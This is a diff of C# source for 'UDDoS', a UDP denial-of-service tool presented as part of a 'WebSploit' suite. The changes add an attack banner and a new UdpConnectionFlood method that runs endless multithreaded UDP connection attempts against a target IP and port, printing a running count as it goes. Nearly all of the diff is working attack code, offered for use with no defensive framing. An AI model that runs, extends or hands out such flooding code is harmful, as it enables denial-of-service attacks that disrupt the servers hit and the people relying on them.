@@ -33,7 +33,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 
-namespace UDDoS
+namespace WebSploit.UDDoS
 {
     class UdpDDoS
     {
@@ -41,6 +41,7 @@ namespace UDDoS
 
         public static void SendPackage(string ip, int port, int threads)
         {
+            SetupAttackEnv(ip);
             Thread[] ths = new Thread[threads];
             for(int i = 0; i < ths.Length; i++)
             {
@@ -64,6 +65,51 @@ namespace UDDoS
                 });
                 ths[i].Start();
             }
+        }
+
+        public static void UdpConnectionFlood(string ip, int port, int threads)
+        {
+            SetupAttackEnv(ip);
+            int counter = 0;
+            Thread[] ths = new Thread[threads];
+            for(int i = 0; i < ths.Length; i++)
+            {
+                ths[i] = new Thread(() => {
+                    while(true)
+                    {
+                        try
+                        {
+                            using(UdpClient client = new UdpClient())
+                            {
+                                client.Connect(IPAddress.Parse(ip), port);
+                                counter++;
+                                Console.WriteLine($"udp/cnnct/> UDP Connection attempt flood on {ip}:{port} >> count {counter}");
+                            }
+                        }
+                        catch(Exception)
+                        {
+                            Console.WriteLine($"[>] Server not responding on {ip}:{port}");
+                        }
+                    }
+                });
+                ths[i].Start();
+            }
+        }
+
+        static void SetupAttackEnv(string ip)
+        {
+            Console.Clear();
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("UDDoS"));
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("UDDoS v1.4 © 2021 MishDotCom");
+            Console.WriteLine("Part of the WebSploit suite.");
+            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine($"Target : {ip}");
+            Console.WriteLine("[INFO] : Begin DDoS attack...\n");
+            Console.ForegroundColor = ConsoleColor.White;
+            Thread.Sleep(150);
         }
     }
 }
